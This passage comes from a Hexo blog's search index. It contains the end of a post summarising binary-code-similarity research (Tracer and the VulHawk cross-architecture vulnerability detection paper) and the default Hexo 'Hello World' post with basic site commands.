encoded as <code>vectors</code>, we can use any common similarity measures – cosine similarity</p>
<p><img src="/./imghost/bcsdpp/traceroverview.jpg" alt="System overview of Tracer"><br><img src="/./imghost/bcsdpp/tracerexample.jpg" alt="Vulnerable traces and their feature vectors"></p>
<h2 id="VulHawk-Cross-architecture-Vulnerability-Detection-with-Entropy-based-Binary-Code-Search"><a href="#VulHawk-Cross-architecture-Vulnerability-Detection-with-Entropy-based-Binary-Code-Search" class="headerlink" title="VulHawk Cross-architecture Vulnerability Detection with Entropy-based Binary Code Search"></a>VulHawk Cross-architecture Vulnerability Detection with Entropy-based Binary Code Search</h2><table>
<thead>
<tr>
<th><a class="link"   href="https://www.ndss-symposium.org/wp-content/uploads/2023/02/ndss2023_f415_paper.pdf" >paper<i class="fas fa-external-link-alt"></i></a></th>
<th>slide</th>
<th>video</th>
<th><a class="link"   href="https://github.com/RazorMegrez/VulHawk" >repo<i class="fas fa-external-link-alt"></i></a></th>
<th>NDSS2023</th>
</tr>
</thead>
</table>
<p>In this paper, we propose a novel intermediate representation function model, which is an architecture-agnostic model for cross-architecture binary code search.</p>
<p>Three components:</p>
<ol>
<li>intermediate representation function model:<br>lifts binary code into <code>microcode</code>(IDA’s IR), and <code>complements implicit oprands</code>, and <code>prunes redundant instructions</code>, and use NLP + GNN to get function embeddings.</li>
</ol>
<p><img src="/./imghost/bcsdpp/vulhawkmicro.jpg" alt="Detailed steps of the instruction simplification"></p>
<ol start="2">
<li>entropy-based adapter:<br>call the combination of a compiler, architecture, and optimization level as a <code>file environment</code>, take a <code>divide-and-conquer strategy</code> to divide a similarity calculation problem of C^2_N cross-file-environment scenarios into N - 1 embedding transferring sub-problems (use <code>ResNet</code> to input features and classify as 8 classes, 2 compilers x 4 optimizations).</li>
</ol>
<p><img src="/./imghost/bcsdpp/vulhawkentropy.jpg" alt="The diagram of divide-and-conquer strategy"></p>
<p>propose an <code>entropy-based adapter</code> to transfer function embeddings from different file environments <code>into the same file environment</code>. didn’t see the entropy, but different <code>adapter</code> weights (associated with file env) for <code>ResNet</code> to cal sim&#x2F;embed.</p>
<ol start="3">
<li>progressive search strategy:<br>propose a <code>progressive search strategy</code> to supplement function embeddings with fine-grained features to reduce false positives caused by patched functions</li>
</ol>
<p>combines two sub-strategies:</p>
<ul>
<li>Function Embedding Search (coarse-grained search)</li>
<li>Similarity Calibration (pairwise similarity calibration)<ul>
<li>Block-level Features</li>
<li>String Features</li>
<li>Imported Functions</li>
</ul>
</li>
</ul>
<p><img src="/./imghost/bcsdpp/vulhawk.jpg" alt="The overall workflow of VulHawk"></p>
]]></content>
      <categories>
        <category>Papers</category>
      </categories>
      <tags>
        <tag>paper</tag>
        <tag>linux</tag>
        <tag>bcsd</tag>
      </tags>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/2018/06/01/hello-world/</url>
    <content><![CDATA[<p>Welcome to <a class="link"   href="https://hexo.io/" >Hexo<i class="fas fa-external-link-alt"></i></a>! This is your very first post. Check <a class="link"   href="https://hexo.io/docs/" >documentation<i class="fas fa-external-link-alt"></i></a> for more info. If you get any problems when using Hexo, you can find the answer in <a class="link"   href="https://hexo.io/docs/troubleshooting.html" >troubleshooting<i class="fas fa-external-link-alt"></i></a> or you can ask me on <a class="link"   href="https://github.com/hexojs/hexo/issues" >GitHub<i class="fas fa-external-link-alt"></i></a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>

<p>More info: <a class="link"   href="https://hexo.io/docs/writing.html" >Writing<i class="fas fa-external-link-alt"></i></a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a class="link"   href="https://hexo.io/docs/server.html" >Server<i class="fas fa-external-link-alt"></i></a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a class="link"   href="https://hexo.io/docs/generating.html" >Generating<i class="fas fa-external-link-alt"></i></a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a class="link"   href="https://hexo.io/docs/one-command-deployment.html" >Deployment<i class="fas fa-external-link-alt"></i></a></p>
]]></content>
  </entry>
</search>
